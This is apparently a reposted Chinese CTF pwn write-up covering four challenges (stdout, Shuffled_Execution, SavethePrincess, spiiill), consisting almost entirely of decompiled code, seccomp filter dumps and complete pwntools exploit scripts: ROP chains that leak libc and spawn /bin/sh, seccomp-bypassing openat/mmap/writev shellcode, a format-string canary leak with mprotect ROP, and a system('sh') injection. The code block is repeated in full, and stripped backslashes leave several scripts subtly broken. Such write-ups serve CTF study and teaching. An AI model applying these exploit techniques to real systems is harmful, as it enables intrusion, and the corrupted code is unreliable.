# PWN 赛题解析

> 原文: https://www.ctfiot.com/196469.html
> ID: 196469

一

stdout

int __fastcall main(int argc, const char **argv, const char **envp)
{
 char buf[80]; // [rsp+0h] [rbp-50h] BYREF

 init(argc, argv, envp);
 puts("where is my stdout???");
 read(0, buf, 0x60uLL);
 return 0;
}

ssize_t vuln()
{
 char buf[32]; // [rsp+0h] [rbp-20h] BYREF

 return read(0, buf, 0x200uLL);
}

int init()
{
 setvbuf(stdout, 0LL, 0, 0LL);
 return setvbuf(stdin, 0LL, 2, 0LL);
}

int init()
{
 ;
 return setvbuf(stdin, 0LL, 2, 0LL);
}

from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')
libc = ELF('./libc-2.31.so')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

vuln = 0x40125D
extend = 0x401287
puts_plt = 0x4010B0
read_got = 0x404028
pop_rdi_ret = 0x00000000004013d3

payload = b'a'*0x58 + p64(vuln)
s(payload)

#gdb.attach(p,'b *0x40127F')
#pause()

p2 = b'a'*0x28 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) +p64(extend) + p64(vuln)
s(p2)

#gdb.attach(p,'b *0x40127F')
#pause()

#重复调用extend函数填满缓冲区
for i in range(20):
 p3 = b'b'*0x28 + p64(extend) + p64(vuln)
 s(p3)

#p3 = b'a'*0x28 + p64(extend) + p64(vuln)
#s(p3)
p.recvuntil(b'n')
libcbase = u64(p.recv(6).ljust(8,b'x00')) - 0x10dfc0
log.success('libcbase ==> ' + hex(libcbase))
p.recv()

sys=libc.symbols['execve']+libcbase
sh=next(libc.search(b'/bin/sh'))+libcbase

#gdb.attach(p,'b *0x40127F')
#pause()

ret = 0x000000000040101a
pop_rsi_r15 = 0x00000000004013d1
pop_rdx_ret = 0x0000000000142c92 + libcbase
p4 = b'c'*0x28 + p64(pop_rdi_ret) + p64(sh) +p64(pop_rsi_r15)+ p64(0)+ p64(0) +p64(pop_rdx_ret)+ p64(0)+p64(sys)
s(p4)
p.interactive()

二

Shuffled_Execution

line CODE JT JF K
=================================
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x0d 0xc000003e if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff if (A != 0xffffffff) goto 0015
 0005: 0x15 0x09 0x00 0x00000000 if (A == read) goto 0015
 0006: 0x15 0x08 0x00 0x00000001 if (A == write) goto 0015
 0007: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0015
 0008: 0x15 0x06 0x00 0x00000011 if (A == pread64) goto 0015
 0009: 0x15 0x05 0x00 0x00000013 if (A == readv) goto 0015
 0010: 0x15 0x04 0x00 0x00000028 if (A == sendfile) goto 0015
 0011: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0015
 0012: 0x15 0x02 0x00 0x00000127 if (A == preadv) goto 0015
 0013: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0015: 0x06 0x00 0x00 0x00000000 return KILL

ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);

long sys_mmap(unsigned long addr, unsigned long len,
 unsigned long prot, unsigned long flags,
 unsigned long fd, off_t pgoff);

ssize_t writev(int fd, const struct iovec *iov, int iovcnt);

struct iovec {
 void *iov_base; // 指向数据缓冲区的指针
 size_t iov_len; // 缓冲区的长度
};

push 0x100
lea rbx, [rsp+8]
push rbx
mov rsi, rsp

from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

mov_esi_0=b'xbex00x00x00x00'
p.recv()

shell = '''
mov rsp,0x1338000
 mov rax, 0x67616c66
 push rax
 xor rdi, rdi
 sub rdi, 100
 mov rsi, rsp
 xor edx, edx
 xor r10, r10
 push SYS_openat
 pop rax
 syscall

 mov rdi, 0x10000
 mov rsi, 0x1000
 mov rdx, 7
 push 0x12
 pop r10
 push 0x3
 pop r8
 xor r9, r9
 push SYS_mmap
 pop rax
 syscall

 push 1
 pop rdi
 push 0x1 /* iov size */
 pop rdx
 mov rsi, 0x1337070
 push SYS_writev
 pop rax
 syscall
'''

#gdb.attach(p)
#pause()
payload= mov_esi_0+asm(shell)
payload = payload.ljust(0x70,b'x90')
#栈上写参数
payload+= p64(0x10000) + p64(0x100)
s(payload)

p.interactive()

三

SavethePrincess

for ( i = 0; i <= 7; ++i )
 love[i] = rand() % 26 + 97;

key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
data = ''
num = 0

while True:
 sla(b'> n', b'1')
 sa(b'please input your password: n', ''.join(key))
 p.recv(26)
 data = ord(p.recv(1))
 log.success(data)

 if (data == num + 1):
 num += 1

 elif (data == 112):
 key_list = ''.join(key)
 log.success(key_list)
 break

 else:
 key[num] = chr(ord(key[num])+1)

line CODE JT JF K
=================================
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000000 if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000013 if (A == readv) goto 0013
 0008: 0x15 0x04 0x00 0x00000028 if (A == sendfile) goto 0013
 0009: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0013
 0010: 0x15 0x02 0x00 0x00000127 if (A == preadv) goto 0013
 0011: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0013: 0x06 0x00 0x00 0x00000000 return KILL

from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')
libc = ELF('./libc.so.6')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
data = ''
num = 0

while True:
 sla(b'> n', b'1')
 sa(b'please input your password: n', ''.join(key))
 p.recv(26)
 data = ord(p.recv(1))
 log.success(data)

 if (data == num + 1):
 num += 1

 elif (data == 112):
 key_list = ''.join(key)
 log.success(key_list)
 break

 else:
 key[num] = chr(ord(key[num])+1)

#gdb.attach(p, 'b *$rebase(0x166A)')
#pause()

sa(b'ower!!!n', b'%10$p'+b'%15$p'+b'%9$p')
stack = int(p.recv(14), 16)
libcbase = int(p.recv(14), 16) - 0x29d90
canary = int(p.recv(18), 16)
stack_base = int(str(hex(stack))[0:11] + '000', 16)

log.info('stack => '+ hex(stack))
log.info('libcbase => ' + hex(libcbase))
log.info('canary => ' + hex(canary))
log.info('stack_base => ' + hex(stack_base))

#gdb.attach(p, 'b *$rebase(0x170B)')
#pause()

#bss = pie + 0x4320
#start = 0x4000 + pie
pop_rdi_ret = 0x000000000002a3e5 + libcbase
pop_rsi_ret = 0x000000000002be51 + libcbase
pop_rdx_r12_ret = 0x000000000011f2e7 + libcbase
mprotect = libc.symbols['mprotect'] + libcbase
#read = libc.symbols['read'] + libcbase
leave_ret = 0x000000000004da83 + libcbase

shellcode ='''
 mov rax, 0x67616c66
 push rax
 xor rdi, rdi
 sub rdi, 100
 mov rsi, rsp
 xor edx, edx
 xor r10, r10
 push SYS_openat
 pop rax
 syscall

 mov rdi, 0x10000
 mov rsi, 0x1000
 mov rdx, 7
 push 0x12
 pop r10
 push 0x3
 pop r8
 xor r9, r9
 push SYS_mmap
 pop rax
 syscall

 mov rdi, 1
 mov rsi,0x10000
 mov rdx,0x40
 push SYS_write
 pop rax
 syscall

'''

payload = b'a'*0x38 + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(stack_base)
payload+= p64(pop_rsi_ret) + p64(0x20000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0)
payload+= p64(mprotect) + p64(stack + 0x30) + asm(shellcode)
sla(b'> n', b'2')
sa(b'dragon!!n', payload)

p.interactive()

四

spiiill

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
 int v3; // [rsp+0h] [rbp-4834h] BYREF
 char s[2096]; // [rsp+4h] [rbp-4830h] BYREF
 char v5; // [rsp+834h] [rbp-4000h] BYREF
 __int64 v6[512]; // [rsp+3834h] [rbp-1000h] BYREF

 while ( v6 != (__int64 *)&v5 )
 ;
 v6[511] = __readfsqword(0x28u);
 Init(a1, a2, a3);
 memset(s, 0, 0x4828uLL);
 while ( 1 )
 {
 while ( 1 )
 {
 puts("Give me your choice: ");
 __isoc99_scanf("%d", &v3);
 if ( v3 != 4 )
 break;
 Bye();
 }
 if ( v3 <= 4 )
 {
 switch ( v3 )
 {
 case 3:
 Choice((__int64)s);
 break;
 case 1:
 sandbox();
 break;
 case 2:
 Read((__int64)s);
 break;
 }
 }
 }
}

ssize_t __fastcall sub_1DE2(__int64 a1)
{
 puts("see you");
 return read(0, (void *)(a1 + 0x808), 0x400uLL);
}

int __fastcall sub_1CFB(__int64 a1)
{
 __int64 v1; // rax
 unsigned __int64 v3; // [rsp+18h] [rbp-8h]

 while ( 1 )
 {
 v1 = *(_QWORD *)(a1 + 0x2808);
 *(_QWORD *)(a1 + 0x2808) = v1 + 1;
 v3 = *(_QWORD *)(a1 + 8 * (v1 + 256) + 8);
 if ( v3 > 11 )
 break;
 ((void (__fastcall *)(__int64))choice[v3])(a1);
 }
 return printf("Unknown instruction %zun", v3);
}

int __fastcall vuln(__int64 a1)
{
 __int64 v1; // rax

 v1 = *(_QWORD *)(a1 + 0x2808);
 *(_QWORD *)(a1 + 0x2808) = v1 + 1;
 return system((const char *)(8 * (*(_QWORD *)(a1 + 8 * (v1 + 256) + 8) + 0x502LL) + a1));
}

__int64 __fastcall sub_1B20(__int64 a1)
{
 __int64 v1; // rax
 __int64 v3; // [rsp+18h] [rbp-8h]

 v3 = *(_QWORD *)(a1 + 0x2808) + 1LL;
 v1 = *(_QWORD *)(a1 + 0x2808);
 *(_QWORD *)(a1 + 0x2808) = v1 + 1;
 ((void (__fastcall *)(__int64))choice[*(_QWORD *)(a1 + 8 * (v1 + 256) + 8)])(a1);
 return overflow(a1, v3);
}

from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

def choice():
 sla(b'Give me your choice: n', b'3')

def Read(num):
 sla(b'Give me your choice: n', b'2')
 sa(b'see youn',num)

#gdb.attach(p, 'b *$rebase(0x1C78)')
#pause()

Read(p64(0xa)+p64(0xc)+p64(0xfffffffffffffc02)+b'shx00')
choice()

p.interactive()

看雪ID：waddle

https://bbs.kanxue.com/user-home-996144.htm

*本文为看雪论坛优秀文章，由 waddle 原创，转载请注明来自看雪社区

# 往期推荐

1、Alt-Tab Terminator注册算法逆向

2、恶意木马历险记

3、VMP源码分析：反调试与绕过方法

4、Chrome V8 issue 1486342浅析

5、Cython逆向-语言特性分析

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
stdout
int __fastcall main(int argc, const char **argv, const char **envp)
{
 char buf[80]; // [rsp+0h] [rbp-50h] BYREF

 init(argc, argv, envp);
 puts("where is my stdout???");
 read(0, buf, 0x60uLL);
 return 0;
}
ssize_t vuln()
{
 char buf[32]; // [rsp+0h] [rbp-20h] BYREF

 return read(0, buf, 0x200uLL);
}
int init()
{
 setvbuf(stdout, 0LL, 0, 0LL);
 return setvbuf(stdin, 0LL, 2, 0LL);
}
int init()
{
 ;
 return setvbuf(stdin, 0LL, 2, 0LL);
}
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')
libc = ELF('./libc-2.31.so')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

vuln = 0x40125D
extend = 0x401287
puts_plt = 0x4010B0
read_got = 0x404028
pop_rdi_ret = 0x00000000004013d3

payload = b'a'*0x58 + p64(vuln)
s(payload)

    #gdb.attach(p,'b *0x40127F')
    #pause()

p2 = b'a'*0x28 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) +p64(extend) + p64(vuln)
s(p2)

    #gdb.attach(p,'b *0x40127F')
    #pause()

#重复调用extend函数填满缓冲区
for i in range(20):
 p3 = b'b'*0x28 + p64(extend) + p64(vuln)
 s(p3)

    #p3 = b'a'*0x28 + p64(extend) + p64(vuln)
    #s(p3)
p.recvuntil(b'n')
libcbase = u64(p.recv(6).ljust(8,b'x00')) - 0x10dfc0
log.success('libcbase ==> ' + hex(libcbase))
p.recv()

sys=libc.symbols['execve']+libcbase
sh=next(libc.search(b'/bin/sh'))+libcbase

    #gdb.attach(p,'b *0x40127F')
    #pause()

ret = 0x000000000040101a
pop_rsi_r15 = 0x00000000004013d1
pop_rdx_ret = 0x0000000000142c92 + libcbase
p4 = b'c'*0x28 + p64(pop_rdi_ret) + p64(sh) +p64(pop_rsi_r15)+ p64(0)+ p64(0) +p64(pop_rdx_ret)+ p64(0)+p64(sys)
s(p4)
p.interactive()
二
Shuffled_Execution
line CODE JT JF K
=================================
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x0d 0xc000003e if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff if (A != 0xffffffff) goto 0015
 0005: 0x15 0x09 0x00 0x00000000 if (A == read) goto 0015
 0006: 0x15 0x08 0x00 0x00000001 if (A == write) goto 0015
 0007: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0015
 0008: 0x15 0x06 0x00 0x00000011 if (A == pread64) goto 0015
 0009: 0x15 0x05 0x00 0x00000013 if (A == readv) goto 0015
 0010: 0x15 0x04 0x00 0x00000028 if (A == sendfile) goto 0015
 0011: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0015
 0012: 0x15 0x02 0x00 0x00000127 if (A == preadv) goto 0015
 0013: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0015: 0x06 0x00 0x00 0x00000000 return KILL
ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);
long sys_mmap(unsigned long addr, unsigned long len,
 unsigned long prot, unsigned long flags,
 unsigned long fd, off_t pgoff);
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
struct iovec {
 void *iov_base; // 指向数据缓冲区的指针
 size_t iov_len; // 缓冲区的长度
};
push 0x100
lea rbx, [rsp+8]
push rbx
mov rsi, rsp
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

mov_esi_0=b'xbex00x00x00x00'
p.recv()

shell = '''
mov rsp,0x1338000
 mov rax, 0x67616c66
 push rax
 xor rdi, rdi
 sub rdi, 100
 mov rsi, rsp
 xor edx, edx
 xor r10, r10
 push SYS_openat
 pop rax
 syscall

 mov rdi, 0x10000
 mov rsi, 0x1000
 mov rdx, 7
 push 0x12
 pop r10
 push 0x3
 pop r8
 xor r9, r9
 push SYS_mmap
 pop rax
 syscall

 push 1
 pop rdi
 push 0x1 /* iov size */
 pop rdx
 mov rsi, 0x1337070
 push SYS_writev
 pop rax
 syscall
'''

    #gdb.attach(p)
    #pause()
payload= mov_esi_0+asm(shell)
payload = payload.ljust(0x70,b'x90')
#栈上写参数
payload+= p64(0x10000) + p64(0x100)
s(payload)

p.interactive()
三
SavethePrincess
for ( i = 0; i <= 7; ++i )
 love[i] = rand() % 26 + 97;
key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
data = ''
num = 0

while True:
 sla(b'> n', b'1')
 sa(b'please input your password: n', ''.join(key))
 p.recv(26)
 data = ord(p.recv(1))
 log.success(data)

 if (data == num + 1):
 num += 1

 elif (data == 112):
 key_list = ''.join(key)
 log.success(key_list)
 break

 else:
 key[num] = chr(ord(key[num])+1)
line CODE JT JF K
=================================
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000000 if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000013 if (A == readv) goto 0013
 0008: 0x15 0x04 0x00 0x00000028 if (A == sendfile) goto 0013
 0009: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0013
 0010: 0x15 0x02 0x00 0x00000127 if (A == preadv) goto 0013
 0011: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0013: 0x06 0x00 0x00 0x00000000 return KILL
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')
libc = ELF('./libc.so.6')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
data = ''
num = 0

while True:
 sla(b'> n', b'1')
 sa(b'please input your password: n', ''.join(key))
 p.recv(26)
 data = ord(p.recv(1))
 log.success(data)

 if (data == num + 1):
 num += 1

 elif (data == 112):
 key_list = ''.join(key)
 log.success(key_list)
 break

 else:
 key[num] = chr(ord(key[num])+1)

    #gdb.attach(p, 'b *$rebase(0x166A)')
    #pause()

sa(b'ower!!!n', b'%10$p'+b'%15$p'+b'%9$p')
stack = int(p.recv(14), 16)
libcbase = int(p.recv(14), 16) - 0x29d90
canary = int(p.recv(18), 16)
stack_base = int(str(hex(stack))[0:11] + '000', 16)

log.info('stack => '+ hex(stack))
log.info('libcbase => ' + hex(libcbase))
log.info('canary => ' + hex(canary))
log.info('stack_base => ' + hex(stack_base))

    #gdb.attach(p, 'b *$rebase(0x170B)')
    #pause()

    #bss = pie + 0x4320
    #start = 0x4000 + pie
pop_rdi_ret = 0x000000000002a3e5 + libcbase
pop_rsi_ret = 0x000000000002be51 + libcbase
pop_rdx_r12_ret = 0x000000000011f2e7 + libcbase
mprotect = libc.symbols['mprotect'] + libcbase
    #read = libc.symbols['read'] + libcbase
leave_ret = 0x000000000004da83 + libcbase

shellcode ='''
 mov rax, 0x67616c66
 push rax
 xor rdi, rdi
 sub rdi, 100
 mov rsi, rsp
 xor edx, edx
 xor r10, r10
 push SYS_openat
 pop rax
 syscall

 mov rdi, 0x10000
 mov rsi, 0x1000
 mov rdx, 7
 push 0x12
 pop r10
 push 0x3
 pop r8
 xor r9, r9
 push SYS_mmap
 pop rax
 syscall

 mov rdi, 1
 mov rsi,0x10000
 mov rdx,0x40
 push SYS_write
 pop rax
 syscall

'''

payload = b'a'*0x38 + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(stack_base)
payload+= p64(pop_rsi_ret) + p64(0x20000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0)
payload+= p64(mprotect) + p64(stack + 0x30) + asm(shellcode)
sla(b'> n', b'2')
sa(b'dragon!!n', payload)

p.interactive()
四
spiiill
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
 int v3; // [rsp+0h] [rbp-4834h] BYREF
 char s[2096]; // [rsp+4h] [rbp-4830h] BYREF
 char v5; // [rsp+834h] [rbp-4000h] BYREF
 __int64 v6[512]; // [rsp+3834h] [rbp-1000h] BYREF

 while ( v6 != (__int64 *)&v5 )
 ;
 v6[511] = __readfsqword(0x28u);
 Init(a1, a2, a3);
 memset(s, 0, 0x4828uLL);
 while ( 1 )
 {
 while ( 1 )
 {
 puts("Give me your choice: ");
 __isoc99_scanf("%d", &v3);
 if ( v3 != 4 )
 break;
 Bye();
 }
 if ( v3 <= 4 )
 {
 switch ( v3 )
 {
 case 3:
 Choice((__int64)s);
 break;
 case 1:
 sandbox();
 break;
 case 2:
 Read((__int64)s);
 break;
 }
 }
 }
}
ssize_t __fastcall sub_1DE2(__int64 a1)
{
 puts("see you");
 return read(0, (void *)(a1 + 0x808), 0x400uLL);
}
int __fastcall sub_1CFB(__int64 a1)
{
 __int64 v1; // rax
 unsigned __int64 v3; // [rsp+18h] [rbp-8h]

 while ( 1 )
 {
 v1 = *(_QWORD *)(a1 + 0x2808);
 *(_QWORD *)(a1 + 0x2808) = v1 + 1;
 v3 = *(_QWORD *)(a1 + 8 * (v1 + 256) + 8);
 if ( v3 > 11 )
 break;
 ((void (__fastcall *)(__int64))choice[v3])(a1);
 }
 return printf("Unknown instruction %zun", v3);
}
int __fastcall vuln(__int64 a1)
{
 __int64 v1; // rax

 v1 = *(_QWORD *)(a1 + 0x2808);
 *(_QWORD *)(a1 + 0x2808) = v1 + 1;
 return system((const char *)(8 * (*(_QWORD *)(a1 + 8 * (v1 + 256) + 8) + 0x502LL) + a1));
}
__int64 __fastcall sub_1B20(__int64 a1)
{
 __int64 v1; // rax
 __int64 v3; // [rsp+18h] [rbp-8h]

 v3 = *(_QWORD *)(a1 + 0x2808) + 1LL;
 v1 = *(_QWORD *)(a1 + 0x2808);
 *(_QWORD *)(a1 + 0x2808) = v1 + 1;
 ((void (__fastcall *)(__int64))choice[*(_QWORD *)(a1 + 8 * (v1 + 256) + 8)])(a1);
 return overflow(a1, v3);
}
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

def choice():
 sla(b'Give me your choice: n', b'3')

def Read(num):
 sla(b'Give me your choice: n', b'2')
 sa(b'see youn',num)

    #gdb.attach(p, 'b *$rebase(0x1C78)')
    #pause()

Read(p64(0xa)+p64(0xc)+p64(0xfffffffffffffc02)+b'shx00')
choice()

p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1722334654.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1722334655.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1722334655.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/6-1722334656.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/6-1722334656.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/3-1722334656.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1722334657.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/9-1722334657.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/3-1722334658.gif)